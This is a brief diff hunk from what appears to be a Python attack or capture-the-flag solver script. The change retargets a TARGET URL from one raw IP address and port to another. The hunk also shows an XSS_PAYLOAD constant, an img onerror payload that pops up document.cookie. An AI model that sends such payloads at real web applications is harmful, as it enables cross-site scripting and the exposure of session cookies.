@@ -20,7 +20,7 @@ from urllib.parse import unquote
 
 import requests
 
-TARGET = "http://47.120.61.230:33270/"
+TARGET = "http://47.120.47.61:33333/"
 XSS_PAYLOAD = "<img src=x onerror=alert(document.cookie)>"
 
 
